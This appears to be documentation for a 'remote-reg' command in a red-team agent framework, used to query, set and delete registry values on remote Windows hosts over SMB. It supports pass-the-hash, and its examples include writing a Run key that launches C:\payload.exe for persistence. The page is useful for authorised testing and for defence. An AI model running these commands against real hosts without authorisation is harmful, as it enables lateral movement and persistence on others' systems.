+++
title = "remote-reg"
chapter = false
weight = 201
hidden = false
+++

## Summary

Read, write, enumerate, and delete registry keys/values on remote Windows hosts via WinReg RPC over SMB named pipes. Supports password and pass-the-hash authentication. This command runs cross-platform — the agent connects to the remote Windows host's `\PIPE\winreg` named pipe over SMB port 445.

{{% notice info %}}Targets Windows hosts, but can be executed from Windows, Linux, or macOS agents.{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | enum | Operation: `query`, `enum`, `set`, `delete` |
| server | Yes | | Remote Windows host IP or hostname |
| hive | No | HKLM | Registry hive: HKLM, HKCU, HKU, HKCR |
| path | No | | Registry key path (e.g., `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`) |
| name | No | | Value name (required for query, set, delete value) |
| data | No | | Value data (required for set) |
| reg_type | No | REG_SZ | Value type: REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_QWORD, REG_BINARY |
| username | Yes | | Account for authentication |
| password | No | | Password (or use hash for pass-the-hash) |
| hash | No | | NTLM hash in LM:NT or NT-only format |
| domain | No | | Domain name |
| timeout | No | 30 | Connection timeout in seconds |

## Usage

### Enumerate subkeys and values
```
remote-reg -action enum -server 192.168.1.1 -hive HKLM -path SOFTWARE\Microsoft\Windows\CurrentVersion\Run -username Administrator -password P@ssw0rd -domain CORP.LOCAL
```

### Query a specific value
```
remote-reg -action query -server dc01 -hive HKLM -path SOFTWARE\Policies\Microsoft Services\AdmPwd -name AdmPwdEnabled -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain CORP.LOCAL
```

### Set a registry value
```
remote-reg -action set -server 192.168.1.1 -hive HKLM -path SOFTWARE\Microsoft\Windows\CurrentVersion\Run -name Updater -data C:\payload.exe -reg_type REG_SZ -username admin -password pass -domain CORP
```

### Delete a value
```
remote-reg -action delete -server 192.168.1.1 -hive HKLM -path SOFTWARE\Microsoft\Windows\CurrentVersion\Run -name Updater -username admin -password pass
```

### Delete a key (must be empty)
```
remote-reg -action delete -server 192.168.1.1 -hive HKLM -path SOFTWARE\MyApp\TempKey -username admin -password pass
```

## MITRE ATT&CK Mapping

- **T1012** - Query Registry
- **T1112** - Modify Registry
- **T1021.002** - Remote Services: SMB/Windows Admin Shares
